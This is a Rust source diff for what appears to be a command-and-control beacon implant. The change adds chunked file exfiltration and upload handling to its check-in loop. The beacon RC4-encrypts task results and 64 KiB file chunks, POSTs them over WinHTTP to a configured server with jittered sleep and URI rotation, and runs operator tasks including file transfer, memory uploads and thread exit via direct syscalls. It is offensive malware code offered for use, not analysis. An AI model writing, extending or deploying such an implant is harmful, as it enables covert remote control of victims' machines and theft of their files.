@@ -65,9 +65,15 @@ pub struct Instance {
     pub jitter_pct: u32,
     /// Check-in counter (sequential URI rotation).
     pub cycle: u32,
-    /// Task results queued for the next POST body (u32 BE size || records).
+    /// Task results queued for the next POST body — RAW records, the
+    /// results-size header is written at POST time (small records only;
+    /// download chunks are streamed straight into the cycle body).
     pub results: [u8; 512],
     pub results_len: usize,
+    /// Active download (one at a time; the operator queues them anyway).
+    pub download: Option<crate::tasks::DownloadState>,
+    /// Active upload accumulation (one at a time).
+    pub upload: Option<crate::tasks::UploadState>,
 }
 
 /// Module name hashes, computed at compile time (lowercase; resolution is
@@ -265,6 +271,8 @@ unsafe fn bootstrap() -> Option<Instance> {
         #[allow(invalid_value, clippy::uninit_assumed_init)]
         results: core::mem::MaybeUninit::uninit().assume_init(),
         results_len: 0,
+        download: None,
+        upload: None,
     })
 }
 
@@ -411,21 +419,28 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         hi += 1;
     }
 
-    // Body: RC4(session) of the framed results queued by the previous cycle.
-    let mut body: [u8; 640] = core::mem::MaybeUninit::uninit().assume_init();
-    let body_len = if instance.results_len > 0 {
-        let n = match transport::wrap_results_frame(
-            &instance.results[..instance.results_len],
-            &mut body,
-        ) {
-            Some(n) => n,
-            None => return,
-        };
-        Rc4::new(&instance.session_key).crypt_in_place(&mut body[..n]);
-        n
-    } else {
-        0
+    // Body: RC4(session) of the framed results — the records queued by
+    // the previous cycle plus the streaming download progress (one
+    // 64 KiB chunk per POST, docs/WIRE.md). Everything read below is
+    // written first (uninit buffers, the memset rule).
+    let mut results: [u8; 0x12000] = core::mem::MaybeUninit::uninit().assume_init();
+    let mut w = Writer::new(&mut results);
+    if !transport::begin_results(&mut w)
+        || (instance.results_len > 0 && !w.push(&instance.results[..instance.results_len]))
+    {
+        return;
+    }
+    let mut chunk: [u8; 64 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
+    crate::tasks::download_tick(instance, &mut w, &mut chunk);
+    if !transport::finish_results(&mut w) {
+        return;
+    }
+    let mut body: [u8; 0x12005] = core::mem::MaybeUninit::uninit().assume_init();
+    let body_len = match transport::wrap_results_frame(w.written_bytes(), &mut body) {
+        Some(n) => n,
+        None => return,
     };
+    Rc4::new(&instance.session_key).crypt_in_place(&mut body[..body_len]);
 
     let (host, port) = split_host_port(config::host(0).as_bytes());
     // URI rotation: sequential walks the list, random re-rolls each cycle.
@@ -442,7 +457,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         body: &body[..body_len],
     };
 
-    let mut resp: [u8; 0x4000] = core::mem::MaybeUninit::uninit().assume_init();
+    let mut resp: [u8; 0x10000] = core::mem::MaybeUninit::uninit().assume_init();
     let resp_len = match winhttp::post(&wh, &request, &mut resp) {
         Some(len) => len,
         None => return,
@@ -473,12 +488,23 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     let mut r = specter_core::wire::Reader::new(pack);
 
     // Dispatch + queue the acknowledgements for the next cycle.
-    let mut results: [u8; 2048] = core::mem::MaybeUninit::uninit().assume_init();
-    let mut w = Writer::new(&mut results);
-    if !transport::begin_results(&mut w) {
-        return;
-    }
+    // Records for the next cycle land here as RAW bytes (the size
+    // header is written at POST time — download chunks bypass this
+    // queue and stream straight into the cycle body).
+    let mut queued: [u8; 512] = core::mem::MaybeUninit::uninit().assume_init();
+    let mut w = Writer::new(&mut queued);
     while r.remaining() >= 8 {
+        // SAVEMEMORY chunks carry up to a full upload piece: handle
+        // them inline, the chunk borrows the response buffer.
+        if r.peek_u32_le() == Some(transport::COMMAND_SAVEMEMORY) {
+            match transport::parse_save_memory(&mut r) {
+                Some((memory_id, expected, chunk)) => {
+                    crate::tasks::save_memory(instance, memory_id, expected, chunk);
+                }
+                None => break,
+            }
+            continue;
+        }
         match transport::parse_task(&mut r) {
             Some((Task::Sleep { sec, jitter_pct }, id)) => {
                 instance.sleep_ms = sec.saturating_mul(1000);
@@ -491,27 +517,23 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
                 syscalls::exit_thread(instance.exit_thread);
             }
             Some((task, id)) => {
-                // File commands: execute, queue the result record.
+                // File/system/transfer commands: execute, queue the
+                // result record.
                 crate::tasks::handle(instance, task, id, &mut w);
             }
             None => break, // unknown command: drop the rest (stays hosted)
         }
     }
-    if !transport::finish_results(&mut w) {
-        return;
-    }
     // Manual copy (memcpy rule): only the written prefix moves to the
-    // instance.
+    // instance. An overflowing queue drops the tail — the 512-byte cap
+    // covers every small record this code produces.
     let n = w.written();
-    if n > instance.results.len() {
-        return;
-    }
     let mut i = 0;
-    while i < n {
-        instance.results[i] = results[i];
+    while i < n && i < instance.results.len() {
+        instance.results[i] = queued[i];
         i += 1;
     }
-    instance.results_len = n;
+    instance.results_len = i;
 }
 
 /// Beacon main, called by the entry stub. Never returns.
